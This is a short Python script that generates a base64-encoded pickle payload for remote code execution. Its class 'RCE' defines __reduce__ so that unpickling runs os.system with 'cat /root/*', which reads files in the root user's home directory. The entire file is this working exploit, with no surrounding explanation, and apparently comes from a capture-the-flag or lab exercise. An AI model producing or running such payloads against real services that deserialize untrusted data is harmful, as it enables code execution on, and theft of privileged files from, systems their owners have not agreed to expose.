import pickle
import base64


class RCE(object):
    def __reduce__(self):
        import os
        cmd = ('cat /root/*')
        return os.system, (cmd, )


if __name__ == '__main__':
    pickle_payload = base64.b64encode(pickle.dumps(RCE()))
    print(pickle_payload)
